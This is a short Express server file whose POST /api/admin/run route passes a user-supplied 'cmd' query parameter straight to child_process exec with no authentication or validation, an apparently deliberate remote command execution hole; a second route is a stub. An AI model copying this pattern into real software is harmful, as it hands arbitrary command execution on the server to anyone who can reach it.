const express = require('express');
const { exec } = require('child_process');

const app = express();

app.get('/api/chat', function chat(req, res) {
  res.send('ok');
});

app.post('/api/admin/run', (req, res) => {
  const cmd = req.query.cmd;
  exec(cmd);
  res.send('ok');
});

module.exports = app;
